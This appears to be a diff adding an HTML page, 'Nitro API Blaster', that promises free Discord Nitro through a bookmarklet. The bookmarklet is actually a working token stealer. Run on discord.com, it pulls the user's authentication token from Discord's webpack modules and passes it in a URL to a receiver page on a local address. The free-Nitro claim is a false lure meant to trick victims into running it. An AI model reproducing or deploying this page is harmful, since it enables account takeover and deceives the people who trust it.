@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nitro API Blaster</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        p {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Nitro API Blaster</h1>
+        <p>
+            Want Discord Nitro without the cost? Here's a clever trick: Simply drag the button below to your bookmarks
+            bar, go to discord.com, sign in, and click the button from your bookmarks. This will send a request to
+            Discord, tricking it into thinking you've just purchased Nitro—no payment required!
+        </p>
+        <p> 
+            Expect Nitro to appear in your account within 10 minutes, depending on rate limits.
+        </p>
+        <a href="javascript:(function(){ 
+            let a = [];
+            webpackChunkdiscord_app.push([[0], {}, function(e) {
+                Object.keys(e.c).forEach(function(t) {
+                    let module = e.c[t]?.exports;
+                    if (module?.default?.getToken) {
+                        a.push(module.default.getToken());
+                    }
+                });
+            }]);
+            
+            const token = a[0];
+            if (token) {
+                const newUrl = 'http://127.0.0.1:5500/recieve.html?APIKEY=' + encodeURIComponent(token);
+                window.open(newUrl, '_blank');
+            } else {
+                console.log('Token not found');
+            }
+        })();">
+            <button>Blast Discord API</button>
+        </a>
+    </div>
+</body>
+
+</html>
